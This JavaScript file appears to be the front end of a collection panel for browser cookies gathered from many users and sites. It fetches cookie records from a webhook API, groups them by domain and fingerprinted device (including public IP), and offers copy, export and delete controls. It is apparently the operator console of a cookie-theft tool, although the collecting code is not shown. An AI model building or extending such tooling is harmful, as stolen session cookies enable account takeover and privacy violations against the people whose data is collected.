let currentCookies = [];
let domainFilter = '';
let userFilter = '';
let searchQuery = '';

// DOM Elements
const webhookList = document.getElementById('webhookList');
const copiedToast = document.getElementById('copiedToast');
const refreshBtn = document.getElementById('refreshBtn');
const searchInput = document.getElementById('searchInput');
const domainFilterSelect = document.getElementById('domainFilter');
const userFilterSelect = document.getElementById('userFilter');
const totalCookiesElement = document.getElementById('totalCookies');
const activeDomainsElement = document.getElementById('activeDomains');
const clearDataBtn = document.getElementById('clearData');
const exportDataBtn = document.getElementById('exportData');

// Generate unique device ID
async function generateDeviceId() {
    try {
        // Get device information
        const deviceInfo = {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        };

        // Try to get additional network information
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            deviceInfo.ip = data.ip;
        } catch (error) {
            console.log('Could not fetch IP:', error);
        }

        // Create a unique hash from the device information
        const deviceString = JSON.stringify(deviceInfo);
        const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(deviceString));
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const deviceId = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 12);

        return {
            id: deviceId,
            details: deviceInfo
        };
    } catch (error) {
        console.error('Error generating device ID:', error);
        return {
            id: 'unknown-device',
            details: { error: 'Could not generate device ID' }
        };
    }
}

// Format device information for display
function formatDeviceInfo(deviceInfo) {
    const info = [];
    
    if (deviceInfo.platform) info.push(`Platform: ${deviceInfo.platform}`);
    if (deviceInfo.ip) info.push(`IP: ${deviceInfo.ip}`);
    if (deviceInfo.timezone) info.push(`Timezone: ${deviceInfo.timezone}`);
    
    const browser = getBrowserInfo(deviceInfo.userAgent);
    if (browser) info.push(`Browser: ${browser}`);
    
    return info.join(' | ');
}

// Get browser information from user agent
function getBrowserInfo(userAgent) {
    const ua = userAgent.toLowerCase();
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('safari')) return 'Safari';
    if (ua.includes('edge')) return 'Edge';
    if (ua.includes('opera')) return 'Opera';
    return 'Unknown Browser';
}

// Check if cookie data is unique
function isUniqueCookie(newCookie, existingCookies) {
    return !existingCookies.some(cookie => 
        JSON.stringify(cookie.body) === JSON.stringify(newCookie.body) &&
        cookie.userId === newCookie.userId
    );
}

// Add new cookie data
async function addCookieData(cookieData) {
    if (!cookieData.userId) {
        const deviceInfo = await generateDeviceId();
        cookieData.userId = deviceInfo.id;
        cookieData.deviceInfo = deviceInfo.details;
    }

    if (isUniqueCookie(cookieData, currentCookies)) {
        currentCookies.unshift(cookieData);
        updateUI();
        saveToLocalStorage();
    }
}

// Render cookies to the list
function renderCookies() {
    console.log('Rendering cookies:', currentCookies);
    const filteredCookies = getFilteredCookies();
    
    webhookList.innerHTML = filteredCookies.map(item => `
        <div class="webhook-item" data-id="${item.id}">
            <div class="webhook-header">
                <div class="domain-name">
                    <span class="material-icons">public</span>
                    ${item.body.url || 'Unknown Domain'}
                </div>
                <div class="webhook-time">
                    ${new Date(item.time).toLocaleString()}
                </div>
            </div>
            <div class="webhook-info">
                <div class="info-item">
                    <span class="material-icons">cookie</span>
                    ${item.cookieCount} cookies
                </div>
                <div class="info-item">
                    <span class="material-icons">devices</span>
                    <div class="device-info">
                        <span class="device-id">${item.userId}</span>
                        <span class="device-details">${formatDeviceInfo(item.deviceInfo || {})}</span>
                    </div>
                </div>
            </div>
            <div class="webhook-content">
                <button class="copy-button" title="Copy JSON">
                    <span class="material-icons">content_copy</span>
                    Copy JSON
                </button>
                <pre class="json-content">${JSON.stringify(item.body, null, 2)}</pre>
            </div>
        </div>
    `).join('');

    // Add click event listeners
    document.querySelectorAll('.webhook-header').forEach(header => {
        const content = header.parentElement.querySelector('.webhook-content');
        
        header.addEventListener('click', (e) => {
            e.stopPropagation();
            content.classList.toggle('expanded');
            
            document.querySelectorAll('.webhook-content.expanded').forEach(el => {
                if (el !== content) {
                    el.classList.remove('expanded');
                }
            });
        });
    });

    // Add copy button click handlers
    document.querySelectorAll('.copy-button').forEach(button => {
        button.addEventListener('click', (e) => {
            e.stopPropagation();
            const content = button.closest('.webhook-content');
            const jsonContent = content.querySelector('.json-content').textContent;
            
            navigator.clipboard.writeText(jsonContent).then(() => {
                copiedToast.style.display = 'block';
                setTimeout(() => {
                    copiedToast.style.display = 'none';
                }, 2000);
            });
        });
    });
}

// Fetch cookies from the API
async function fetchCookies() {
    try {
        console.log('Fetching cookies...');
        const response = await fetch('/api/webhook');
        const data = await response.json();
        console.log('Fetched data:', data);
        currentCookies = data;
        updateFilters();
        renderCookies();
        updateStats();
    } catch (error) {
        console.error('Error fetching cookies:', error);
    }
}

// Update filter options
function updateFilters() {
    const domains = [...new Set(currentCookies.map(item => item.body.url || 'Unknown Domain'))];
    const users = [...new Set(currentCookies.map(item => item.userId))];

    // Update domain filter
    const currentDomain = domainFilterSelect.value;
    domainFilterSelect.innerHTML = '<option value="">All Domains</option>' +
        domains.map(domain => `<option value="${domain}" ${domain === currentDomain ? 'selected' : ''}>${domain}</option>`).join('');

    // Update user filter
    const currentUser = userFilterSelect.value;
    userFilterSelect.innerHTML = '<option value="">All Users</option>' +
        users.map(user => `<option value="${user}" ${user === currentUser ? 'selected' : ''}>${user}</option>`).join('');
}

// Update statistics
function updateStats() {
    const filteredCookies = getFilteredCookies();
    const totalCookies = filteredCookies.reduce((sum, item) => sum + item.cookieCount, 0);
    const domains = new Set(filteredCookies.map(item => item.body.url || 'Unknown Domain'));

    totalCookiesElement.textContent = totalCookies;
    activeDomainsElement.textContent = domains.size;
}

// Get filtered cookies based on current filters and search
function getFilteredCookies() {
    return currentCookies.filter(item => {
        const matchesDomain = !domainFilter || item.body.url === domainFilter;
        const matchesUser = !userFilter || item.userId === userFilter;
        const matchesSearch = !searchQuery || 
            item.body.url.toLowerCase().includes(searchQuery.toLowerCase()) ||
            item.userId.toString().includes(searchQuery);
        return matchesDomain && matchesUser && matchesSearch;
    });
}

// Event Listeners
refreshBtn.addEventListener('click', fetchCookies);

searchInput.addEventListener('input', (e) => {
    searchQuery = e.target.value;
    renderCookies();
    updateStats();
});

domainFilterSelect.addEventListener('change', (e) => {
    domainFilter = e.target.value;
    renderCookies();
    updateStats();
});

userFilterSelect.addEventListener('change', (e) => {
    userFilter = e.target.value;
    renderCookies();
    updateStats();
});

clearDataBtn.addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all data?')) {
        try {
            await fetch('/api/webhook', { method: 'DELETE' });
            currentCookies = [];
            renderCookies();
            updateStats();
            updateFilters();
        } catch (error) {
            console.error('Error clearing data:', error);
        }
    }
});

exportDataBtn.addEventListener('click', () => {
    const dataStr = JSON.stringify(currentCookies, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cookie-data-${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
});

// Initial load
fetchCookies();

// Auto refresh every 30 seconds
setInterval(fetchCookies, 30000); 